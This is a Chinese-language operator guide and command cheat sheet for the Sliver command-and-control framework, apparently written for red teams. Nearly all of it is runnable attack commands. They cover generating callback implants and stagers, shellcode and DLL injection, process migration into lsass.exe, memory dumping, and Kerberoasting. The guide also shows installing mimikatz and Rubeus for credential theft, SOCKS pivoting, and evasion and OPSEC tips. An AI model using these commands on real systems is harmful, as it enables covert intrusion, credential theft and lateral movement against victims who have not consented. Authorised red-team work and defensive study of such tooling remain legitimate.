# Sliver C2 Framework 完整指南

> BishopFox 開源 C2 框架，以 Go 語言編寫，支援多種傳輸協議與跨平台 Implant 生成。

---

## 目錄

1. [基礎概念](#基礎概念)
2. [架構說明](#架構說明)
3. [Beacon vs Session](#beacon-vs-session)
4. [傳輸協議](#傳輸協議)
5. [安裝與基本設定](#安裝與基本設定)
6. [Listeners（監聽器）](#listeners監聽器)
7. [Implant 生成](#implant-生成)
8. [Profiles（設定檔）](#profiles設定檔)
9. [Stageless vs Stager](#stageless-vs-stager)
10. [Session/Beacon 操作](#sessionbeacon-操作)
11. [Pivoting & Port Forwarding](#pivoting--port-forwarding)
12. [Process Injection & 記憶體執行](#process-injection--記憶體執行)
13. [BOF（Beacon Object Files）](#bofbeacon-object-files)
14. [Armory 套件管理](#armory-套件管理)
15. [Multiplayer 模式](#multiplayer-模式)
16. [OPSEC 注意事項](#opsec-注意事項)
17. [完整指令參考](#完整指令參考)
18. [指令速查表](#指令速查表)

---

## 基礎概念

### 什麼是 Sliver？

Sliver 是 BishopFox 開發的開源 Command & Control (C2) 框架，設計用於紅隊操作與滲透測試。

**主要特點：**
- 以 Go 語言編寫，跨平台（Windows / Linux / macOS）
- 支援 mTLS、WireGuard、HTTP/S、DNS、Named Pipe、TCP 等傳輸協議
- 兩種 Implant 模式：Session（互動）與 Beacon（異步）
- 內建 SOCKS5 Proxy、Port Forwarding、Process Injection
- 支援 BOF（Beacon Object Files）與 .NET Assembly 執行
- 多操作員（Multiplayer）支援

### 核心術語

| 術語 | 說明 |
|------|------|
| **Server** | Sliver 服務端，管理所有連線與 Implant |
| **Operator** | 連接到 Server 的操作者（紅隊成員）|
| **Implant** | 在目標主機上執行的惡意程式（Beacon 或 Session）|
| **Listener / Job** | Server 端等待 Implant 回連的服務 |
| **Beacon** | 異步模式 Implant，定期回連執行任務 |
| **Session** | 互動模式 Implant，即時雙向通訊 |
| **Profile** | 保存的 Implant 生成參數設定檔 |
| **Armory** | Sliver 的延伸套件管理器（類 Cobalt Strike BOF/COFF）|
| **Stager** | 小型下載器，下載並執行 Stage 2 Payload |

---

## 架構說明

```
┌─────────────┐         ┌──────────────┐
│  Operator   │  mTLS   │    Sliver    │
│  (Client)   │◄───────►│    Server    │
└─────────────┘         └──────┬───────┘
                               │  Listeners
                    ┌──────────┼──────────┐
                    │          │          │
               mTLS/HTTP    WireGuard   DNS
                    │          │          │
               ┌────▼──────────▼──────────▼────┐
               │         Target Network         │
               │   ┌─────────┐  ┌─────────┐    │
               │   │ Beacon  │  │ Session │    │
               │   │ Implant │  │ Implant │    │
               │   └─────────┘  └─────────┘    │
               └────────────────────────────────┘
```

**通訊流程：**
1. Server 啟動並開放 Listener（如 mTLS :4444）
2. Implant 執行後主動回連 Server
3. Operator 透過 Client 連接 Server
4. Operator 對 Session/Beacon 下達指令，Server 轉發給 Implant

---

## Beacon vs Session

| 特性 | Beacon | Session |
|------|--------|---------|
| **通訊方式** | 定期輪詢（Pull）| 即時連線（Push）|
| **互動性** | 異步，需等待下次 Checkin | 即時互動 |
| **OPSEC** | 較佳（流量間歇性）| 較差（持續連線）|
| **適用場景** | 長期潛伏、橫向移動 | 快速互動、偵察 |
| **Sleep 設定** | 可設定 sleep + jitter | 不適用 |
| **任務執行** | 排隊，下次 Checkin 執行 | 立即執行 |
| **指令前綴** | 無特殊前綴 | 無特殊前綴 |
| **查看回應** | `tasks fetch` | 立即顯示 |

**建議策略：**
- 初始存取使用 Session（需要快速偵察）
- 建立立足點後轉換為 Beacon（降低偵測風險）
- 使用 `interactive` 將 Beacon 暫時轉為 Session

---

## 傳輸協議

### mTLS（Mutual TLS）— 預設推薦

```bash
# 啟動 mTLS Listener
mtls --lhost 0.0.0.0 --lport 4444

# 生成 mTLS Implant
generate --mtls <LHOST>:4444 --os windows --arch amd64 --save /tmp/
```

**特點：**
- 雙向憑證驗證（Server 驗證 Implant，Implant 驗證 Server）
- 每個 Implant 有唯一嵌入式憑證
- 流量加密，難以解密
- 預設使用非標準 port，建議改為 443

### HTTP/HTTPS

```bash
# 啟動 HTTPS Listener
https --lhost 0.0.0.0 --lport 443 --domain example.com

# 生成 HTTPS Implant
generate --https <LHOST>:443 --os windows --arch amd64
```

**特點：**
- 流量融入正常 HTTPS 流量
- 支援域前置（Domain Fronting）
- 適合 Egress Filtering 環境

### DNS

```bash
# 啟動 DNS Listener
dns --domains c2.example.com

# 生成 DNS Implant
generate --dns c2.example.com --os windows
```

**特點：**
- 透過 DNS TXT/A 記錄傳輸資料
- 速度較慢，但穿透力強
- 適合嚴格 Egress 環境

### WireGuard

```bash
# 啟動 WireGuard Listener
wg --lhost 0.0.0.0 --lport 53

# 生成 WireGuard Implant
generate --wg <LHOST>:53 --os linux
```

### Named Pipe（Windows 內網橫向）

```bash
# 生成 Named Pipe Implant
generate --named-pipe \\.\pipe\sliver
```

### TCP（直連）

```bash
# 啟動 TCP Listener
tcp --lhost 0.0.0.0 --lport 8888

# 生成 TCP Implant
generate --tcp-pivot <LHOST>:8888
```

---

## 安裝與基本設定

### 安裝 Sliver Server

```bash
# 下載最新版本
curl -L https://github.com/BishopFoxSec/sliver/releases/latest/download/sliver-server_linux -o /usr/local/bin/sliver-server
chmod +x /usr/local/bin/sliver-server

# 啟動 Server（首次執行會生成 PKI）
sudo sliver-server

# 或以 daemon 方式執行
sudo sliver-server daemon
```

### 安裝 Sliver Client

```bash
curl -L https://github.com/BishopFoxSec/sliver/releases/latest/download/sliver-client_linux -o /usr/local/bin/sliver
chmod +x /usr/local/bin/sliver

# 啟動 Client（本機直接連）
sliver
```

### 初始化流程

```bash
# 啟動 Server 後，自動進入 Console
sliver > 

# 查看版本
sliver > version

# 查看目前 Jobs（Listeners）
sliver > jobs

# 查看目前連線的 Sessions/Beacons
sliver > sessions
sliver > beacons
```

---

## Listeners（監聽器）

Listener 是 Server 上等待 Implant 回連的服務，在 Sliver 中稱為 **Job**。

```bash
# 列出所有 Jobs
jobs

# 啟動各類型 Listener
mtls --lhost 0.0.0.0 --lport 4444
https --lhost 0.0.0.0 --lport 443
http --lhost 0.0.0.0 --lport 80
dns --domains c2.yourdomain.com
wg --lhost 0.0.0.0 --lport 53
tcp --lhost 0.0.0.0 --lport 8888

# 停止特定 Job
jobs --kill <JOB_ID>

# 停止所有 Jobs
jobs --kill-all
```

---

## Implant 生成

### 基本生成指令

```bash
# Windows x64 mTLS Beacon
generate beacon --mtls <LHOST>:4444 --os windows --arch amd64 --save /tmp/

# Windows x64 mTLS Session
generate --mtls <LHOST>:4444 --os windows --arch amd64 --save /tmp/

# Linux x64 HTTPS Beacon
generate beacon --https <LHOST>:443 --os linux --arch amd64 --save /tmp/

# macOS arm64
generate --mtls <LHOST>:4444 --os mac --arch arm64 --save /tmp/
```

### 進階生成選項

```bash
generate [beacon] \
  --mtls <LHOST>:<PORT> \        # 傳輸協議
  --os windows \                  # 目標作業系統 (windows/linux/mac)
  --arch amd64 \                  # 架構 (amd64/386/arm64)
  --format exe \                  # 格式 (exe/dll/shared/shellcode)
  --name my-implant \             # 自訂名稱
  --save /tmp/ \                  # 儲存路徑
  --evasion \                     # 啟用混淆
  --skip-symbols \                # 跳過符號（減小體積）
  --seconds 60 \                  # Beacon sleep 間隔（秒）
  --jitter 30 \                   # Jitter 百分比
  --reconnect 60 \                # 重連間隔（秒）
  --max-errors 10                 # 最大錯誤次數
```

### 輸出格式

| 格式 | 說明 | 使用場景 |
|------|------|---------|
| `exe` | Windows 可執行檔 | 直接執行 |
| `dll` | Windows DLL | DLL Injection、Side-loading |
| `shared` | Linux .so | 共享函式庫注入 |
| `shellcode` | 原始 Shellcode | 注入其他程序 |
| `service` | Windows Service | 服務持久化 |

---

## Profiles（設定檔）

Profile 儲存 Implant 生成參數，方便重複使用。

```bash
# 建立 Profile
profiles new --mtls <LHOST>:4444 --os windows --arch amd64 --format exe beacon-win64

# 列出所有 Profiles
profiles

# 從 Profile 生成 Implant
profiles generate beacon-win64 --save /tmp/

# 刪除 Profile
profiles rm beacon-win64
```

---

## Stageless vs Stager

### Stageless（無階段）

完整 Payload 包含所有功能，直接執行即可回連。

```bash
# 生成 Stageless Implant（預設）
generate --mtls <LHOST>:4444 --os windows --save /tmp/
```

**優點：** 獨立執行，不需要額外網路請求  
**缺點：** 體積較大（數 MB），較易被偵測

### Stager（分段）

小型下載器，執行後下載並記憶體執行 Stage 2。

```bash
# 步驟 1：建立 Profile（Stage 2 的生成規格）
profiles new --mtls <LHOST>:4444 --os windows beacon-profile

# 步驟 2：啟動 Stage 2 HTTP Listener
stage-listener --url http://<LHOST>:8080 --profile beacon-profile

# 步驟 3：生成 Stager Shellcode
generate stager --lhost <LHOST> --lport 8080 --protocol http --save /tmp/stager.bin

# 步驟 4：傳送 Stager 到目標執行
# 目標下載 Stage 2、記憶體執行
```

---

## Session/Beacon 操作

### 進入互動介面

```bash
# 進入 Session
use <SESSION_ID>
# 或
sessions --interact <SESSION_ID>

# 進入 Beacon
use <BEACON_ID>

# 將 Beacon 暫時轉為互動 Session
interactive
```

### 基本系統指令

```bash
# 主機資訊
info              # 顯示 Implant 與目標資訊
whoami            # 當前使用者
getuid            # 使用者 UID
getgid            # 群組 GID
getpid            # 當前程序 PID
hostname          # 主機名稱
pwd               # 當前目錄
ls                # 列出目錄
cat <file>        # 讀取檔案
cd <path>         # 切換目錄
mkdir <path>      # 建立目錄
rm <file>         # 刪除檔案
```

### 檔案操作

```bash
download <remote_path> [local_path]    # 下載檔案
upload <local_path> <remote_path>      # 上傳檔案
```

### 執行指令

```bash
shell                          # 開啟互動式 Shell（Session 限定）
execute --exe cmd.exe -- /c whoami   # 執行命令（靜默）
execute -o --exe cmd.exe -- /c whoami  # 執行並顯示輸出
```

### 截圖 / 監控

```bash
screenshot            # 截取螢幕畫面
```

### 網路資訊

```bash
netstat               # 網路連線狀態
ifconfig              # 網路介面資訊
```

### Beacon 特有操作

```bash
# 查看待執行任務
tasks

# 取得已完成任務結果
tasks fetch

# 修改 Sleep 間隔
sleep 60s              # 設定 60 秒
sleep 60s/20           # 60 秒 ± 20% Jitter
```

---

## Pivoting & Port Forwarding

### SOCKS5 Proxy（內網橫向）

```bash
# 在目標上啟動 SOCKS5 Proxy（需先 use <SESSION_ID>）
socks5 start --host 127.0.0.1 --port 1080

# 列出 SOCKS5 Proxy
socks5

# 停止 SOCKS5 Proxy
socks5 stop --id <ID>

# 配合 proxychains
# /etc/proxychains4.conf 加入：socks5 127.0.0.1 1080
proxychains nmap -sT -p 445 172.16.1.0/24
```

### Port Forwarding

```bash
# 本地 → 遠端（將本地 Port 轉發到目標網路內主機）
portfwd add --remote 172.16.1.10:3389

# 列出 Port Forward 規則
portfwd

# 刪除規則
portfwd rm --id <ID>
```

### Reverse Port Forwarding（目標 → Kali）

```bash
# 目標上的 Port 轉發到 Kali（適合 Ping-back）
rportfwd add --bind-addr 0.0.0.0:8080 --forward-host 127.0.0.1 --forward-port 80
```

### TCP Pivot（透過 Implant 橋接）

```bash
# 在已有 Session 的跳板機上啟動 TCP Pivot Listener
pivots tcp --lhost 0.0.0.0 --lport 9001

# 生成使用 TCP Pivot 的 Implant
generate --tcp-pivot <PIVOT_HOST>:9001 --os windows
```

---

## Process Injection & 記憶體執行

### execute-assembly（執行 .NET Assembly）

```bash
# 在記憶體中執行 .NET DLL，不落地
execute-assembly /path/to/Seatbelt.exe -group=all
execute-assembly /path/to/Rubeus.exe asktgt /user:admin /password:P@ss
execute-assembly /path/to/SharpHound.exe --CollectionMethods All
```

### inline-execute（執行 BOF）

```bash
# 執行 COFF/BOF
inline-execute /path/to/bof.o [args...]
```

### sideload（DLL Side-loading）

```bash
# 加載任意 DLL 到目標程序
sideload --process explorer.exe /path/to/payload.dll [export_func]
```

### spawndll（Spawn 新程序執行 DLL）

```bash
# 生成子程序並執行 DLL
spawndll /path/to/payload.dll [export_func]
```

### execute-shellcode（Shellcode 注入）

```bash
# 注入 Shellcode 到指定 PID
execute-shellcode --pid <PID> /path/to/shellcode.bin

# 或生成新程序注入
execute-shellcode /path/to/shellcode.bin
```

### migrate（程序遷移）

```bash
# 將 Implant 遷移到指定 PID
migrate --pid <PID>
```

### 程序相關

```bash
ps                             # 列出程序
ps --exe lsass.exe             # 搜尋特定程序
procdump --pid <PID>           # Dump 程序記憶體
```

---

## BOF（Beacon Object Files）

BOF 是 COFF 格式的小型物件檔，在 Implant 記憶體內執行，無需 Spawn 新程序。

### 使用方式

```bash
# 直接執行 BOF
inline-execute /path/to/bof.o

# 帶參數執行
inline-execute /path/to/bof.o arg1 arg2
```

### 常用 BOF 來源

- **TrustedSec BOF Collection**: https://github.com/trustedsec/CS-Situational-Awareness-BOF
- **Sliver Armory 內建**: 透過 `armory install` 安裝

---

## Armory 套件管理

Armory 是 Sliver 的擴充套件管理器，提供預編譯的 BOF、.NET Assembly 等工具。

### 基本操作

```bash
# 更新 Armory 套件清單
armory update

# 搜尋套件
armory search rubeus
armory search bloodhound

# 安裝套件
armory install rubeus
armory install sharp-hound
armory install seatbelt
armory install mimikatz

# 安裝全部
armory install all

# 列出已安裝套件
armory

# 移除套件
armory remove rubeus
```

### 常用 Armory 套件

| 套件名稱 | 功能 |
|---------|------|
| `rubeus` | Kerberos 攻擊（AS-REP Roasting、Pass-the-Ticket 等）|
| `sharp-hound` | BloodHound 資料收集 |
| `seatbelt` | 系統安全配置枚舉 |
| `mimikatz` | 憑證提取 |
| `sharp-up` | 本地提權漏洞檢查 |
| `sharp-view` | AD 枚舉（PowerView .NET 版）|
| `sharp-wmi` | WMI 執行 |
| `sharp-dpapi` | DPAPI 解密 |

### 安裝後使用

```bash
# 透過 Armory 執行 Rubeus（記憶體內執行）
rubeus asktgt /user:administrator /password:P@ssw0rd /domain:corp.local /nowrap

# Seatbelt 系統枚舉
seatbelt -group=all

# SharpHound 資料收集
sharp-hound --CollectionMethods All --ZipFileName loot.zip
```

---

## Multiplayer 模式

Multiplayer 允許多個 Operator 同時連接同一 Sliver Server。

### Server 端設定

```bash
# 生成 Operator 設定檔（Server 上執行）
multiplayer new-operator --name alice --lhost <SERVER_IP>

# 這會生成 alice.cfg 檔案
# 將 alice.cfg 傳給 Operator Alice
```

### Client 端設定

```bash
# Operator 使用設定檔連接 Server
sliver import alice.cfg
sliver

# 查看目前連線的 Operators
operators
```

### 多人協作注意事項

- 所有 Operator 共享同一個 Session/Beacon 清單
- 一個 Operator use 某 Session 後，其他人也可操作
- 建議溝通協調避免衝突

---

## OPSEC 注意事項

### Beacon 設定

```bash
# 設定合理的 Sleep + Jitter（建議 60s ± 30%）
sleep 60s/30

# 避免使用預設 Port（4444、8888）
mtls --lport 443    # 使用 443 偽裝 HTTPS
```

### Listener 選擇

- **高 OPSEC**: HTTPS（443）> DNS > mTLS
- **低 OPSEC**: 裸 TCP、預設 Port

### Implant 生成

```bash
# 啟用混淆
generate --evasion --mtls <LHOST>:443

# Shellcode 格式（記憶體執行）
generate --format shellcode --mtls <LHOST>:443
```

### 執行層面

```bash
# 優先使用記憶體執行
execute-assembly ...   # 不落地執行 .NET
inline-execute ...     # BOF 記憶體執行

# 避免直接 cmd.exe/powershell.exe
# 使用 execute --exe powershell.exe -- -enc <BASE64>

# Migrate 到穩定程序
migrate --pid <STABLE_PID>   # explorer.exe、lsass.exe
```

### 清理痕跡

```bash
# 執行完成後關閉 SOCKS/PortFwd
socks5 stop --id <ID>
portfwd rm --id <ID>

# 退出 Session 前清除 History
```

---

## 完整指令參考

### 全域指令（Server Console）

```bash
help                    # 顯示說明
version                 # 顯示版本
sessions                # 列出所有 Sessions
beacons                 # 列出所有 Beacons
use <ID>                # 進入 Session/Beacon
jobs                    # 列出所有 Listeners
jobs --kill <ID>        # 停止 Listener
jobs --kill-all         # 停止所有 Listeners
operators               # 列出 Operators
armory                  # 套件管理
profiles                # 管理 Profiles
loot                    # 查看收集的 Loot
hosts                   # 列出已知主機
implants                # 列出生成的 Implants
```

### Listener 指令

```bash
mtls [--lhost HOST] [--lport PORT]
https [--lhost HOST] [--lport PORT] [--domain DOMAIN]
http [--lhost HOST] [--lport PORT]
dns [--domains DOMAIN]
wg [--lhost HOST] [--lport PORT]
tcp [--lhost HOST] [--lport PORT]
```

### 生成指令

```bash
generate [beacon] [OPTIONS]
  --mtls HOST:PORT          # mTLS 傳輸
  --https HOST:PORT         # HTTPS 傳輸
  --http HOST:PORT          # HTTP 傳輸
  --dns DOMAIN              # DNS 傳輸
  --wg HOST:PORT            # WireGuard 傳輸
  --tcp-pivot HOST:PORT     # TCP Pivot
  --named-pipe PATH         # Named Pipe
  --os windows|linux|mac    # 目標 OS
  --arch amd64|386|arm64    # 目標架構
  --format exe|dll|shellcode|shared|service
  --name NAME               # Implant 名稱
  --save PATH               # 儲存路徑
  --evasion                 # 啟用混淆
  --seconds N               # Sleep 秒數（Beacon）
  --jitter N                # Jitter 百分比（Beacon）
  --reconnect N             # 重連間隔

generate stager             # 生成 Stager
  --lhost HOST
  --lport PORT
  --protocol http|mtls
  --save PATH
```

### Session/Beacon 內部指令

```bash
# 系統資訊
info
whoami
getuid / getgid / getpid
hostname
env                         # 環境變數
registry read KEY           # 讀取登錄
registry write KEY VALUE    # 寫入登錄
registry create KEY         # 建立登錄機碼

# 檔案系統
pwd
ls [PATH]
cat FILE
cd PATH
mkdir PATH
rm FILE / rm -r DIR
mv SRC DST
cp SRC DST
download REMOTE [LOCAL]
upload LOCAL REMOTE

# 執行
shell                       # 互動 Shell（Session）
execute --exe CMD -- ARGS   # 執行程式
execute -o --exe CMD -- ARGS  # 執行並取得輸出
execute-assembly DLL [ARGS]   # .NET Assembly
inline-execute BOF [ARGS]     # BOF
sideload --process PID DLL    # DLL Sideload
spawndll DLL [EXPORT]         # Spawn + DLL
execute-shellcode --pid PID SC.bin  # Shellcode 注入

# 程序
ps
ps --exe NAME
ps --pid PID
procdump --pid PID          # Memory Dump
migrate --pid PID           # 程序遷移
kill --pid PID              # 終止程序

# 網路
netstat
ifconfig

# 擷取
screenshot
```

### Beacon 特有指令

```bash
tasks                       # 列出待執行任務
tasks fetch                 # 取得已完成任務結果
tasks cancel --id ID        # 取消任務
sleep 60s                   # 設定 Sleep
sleep 60s/20                # 設定 Sleep + 20% Jitter
interactive                 # 轉為互動 Session
```

### 後滲透指令

```bash
# Kerberos
kerberoast [--all]          # Kerberoasting
getsystem                   # 提權嘗試

# SOCKS5 Proxy
socks5 start [--host H] [--port P]
socks5
socks5 stop --id ID

# Port Forwarding
portfwd add --remote HOST:PORT [--local-port P]
portfwd
portfwd rm --id ID

# Reverse Port Forward
rportfwd add --bind-addr ADDR:PORT --forward-host H --forward-port P
rportfwd

# TCP Pivot
pivots tcp [--lhost H] [--lport P]
pivots
pivots rm --id ID

# Loot 管理
loot local --name NAME FILE    # 加入本地檔案到 Loot
loot fetch --name NAME         # 取回 Loot
loot rm --name NAME            # 刪除 Loot
```

### Armory 指令

```bash
armory                     # 列出可用套件
armory update              # 更新清單
armory search KEYWORD      # 搜尋
armory install PACKAGE     # 安裝
armory install all         # 全部安裝
armory remove PACKAGE      # 移除
```

### Profile 指令

```bash
profiles                   # 列出 Profiles
profiles new [OPTIONS] NAME  # 建立 Profile
profiles generate NAME [--save PATH]  # 從 Profile 生成
profiles rm NAME           # 刪除 Profile
```

### Multiplayer 指令

```bash
multiplayer                    # 啟用 Multiplayer 模式
multiplayer new-operator --name NAME --lhost HOST
operators                      # 列出 Operators
kick-operator --name NAME      # 踢出 Operator
```

---

## 指令速查表

### 🔧 Server 設定

| 指令 | 功能 |
|------|------|
| `jobs` | 列出所有 Listeners |
| `mtls --lport 4444` | 啟動 mTLS Listener |
| `https --lport 443` | 啟動 HTTPS Listener |
| `http --lport 80` | 啟動 HTTP Listener |
| `dns --domains c2.example.com` | 啟動 DNS Listener |
| `jobs --kill <ID>` | 停止 Listener |
| `sessions` | 列出 Sessions |
| `beacons` | 列出 Beacons |
| `use <ID>` | 進入 Session/Beacon |

### 🔨 Implant 生成

| 指令 | 功能 |
|------|------|
| `generate --mtls LHOST:4444 --os windows` | 生成 Windows mTLS Session |
| `generate beacon --mtls LHOST:4444 --os windows` | 生成 Windows mTLS Beacon |
| `generate --https LHOST:443 --os linux` | 生成 Linux HTTPS Session |
| `generate --format shellcode --mtls LHOST:4444` | 生成 Shellcode |
| `generate --format dll --mtls LHOST:4444` | 生成 DLL |
| `generate --evasion --mtls LHOST:4444` | 啟用混淆生成 |
| `generate stager --lhost LHOST --lport 8080` | 生成 Stager |

### 💻 基本操作

| 指令 | 功能 |
|------|------|
| `whoami` | 當前使用者 |
| `info` | Implant 資訊 |
| `hostname` | 主機名稱 |
| `ps` | 程序清單 |
| `netstat` | 網路連線 |
| `ifconfig` | 網路介面 |
| `pwd` | 當前目錄 |
| `ls [PATH]` | 列出目錄 |
| `screenshot` | 截圖 |

### 📁 檔案操作

| 指令 | 功能 |
|------|------|
| `download REMOTE [LOCAL]` | 下載檔案 |
| `upload LOCAL REMOTE` | 上傳檔案 |
| `cat FILE` | 讀取檔案 |
| `rm FILE` | 刪除檔案 |
| `mkdir PATH` | 建立目錄 |

### 🚀 執行

| 指令 | 功能 |
|------|------|
| `execute -o --exe cmd.exe -- /c whoami` | 執行指令取得輸出 |
| `shell` | 開啟互動 Shell |
| `execute-assembly Rubeus.exe asktgt ...` | 執行 .NET Assembly |
| `inline-execute bof.o` | 執行 BOF |
| `sideload --process explorer.exe payload.dll` | DLL Sideload |
| `execute-shellcode --pid PID sc.bin` | 注入 Shellcode |
| `migrate --pid PID` | 程序遷移 |

### 🌐 Pivoting

| 指令 | 功能 |
|------|------|
| `socks5 start --port 1080` | 啟動 SOCKS5 Proxy |
| `socks5 stop --id ID` | 停止 SOCKS5 |
| `portfwd add --remote HOST:PORT` | 正向 Port Forward |
| `portfwd rm --id ID` | 刪除 Port Forward |
| `rportfwd add --bind-addr 0.0.0.0:8080 --forward-host 127.0.0.1 --forward-port 80` | 反向 Port Forward |
| `pivots tcp --lport 9001` | 啟動 TCP Pivot |

### 🔑 後滲透

| 指令 | 功能 |
|------|------|
| `kerberoast` | Kerberoasting |
| `getsystem` | 嘗試提權 |
| `procdump --pid PID` | Dump 程序記憶體 |
| `tasks` | 查看 Beacon 待執行任務 |
| `tasks fetch` | 取得任務結果 |
| `sleep 60s/30` | 設定 Sleep + Jitter |
| `interactive` | Beacon 轉 Session |

### 📦 Armory 套件

| 指令 | 功能 |
|------|------|
| `armory update` | 更新套件清單 |
| `armory install rubeus` | 安裝 Rubeus |
| `armory install sharp-hound` | 安裝 SharpHound |
| `armory install seatbelt` | 安裝 Seatbelt |
| `armory install mimikatz` | 安裝 Mimikatz |
| `rubeus asktgt /user:USER /password:PASS` | Rubeus 取得 TGT |
| `seatbelt -group=all` | 系統安全枚舉 |
| `sharp-hound --CollectionMethods All` | BloodHound 收集 |

---

*最後更新：2026-08-24 | Sliver v1.5+*
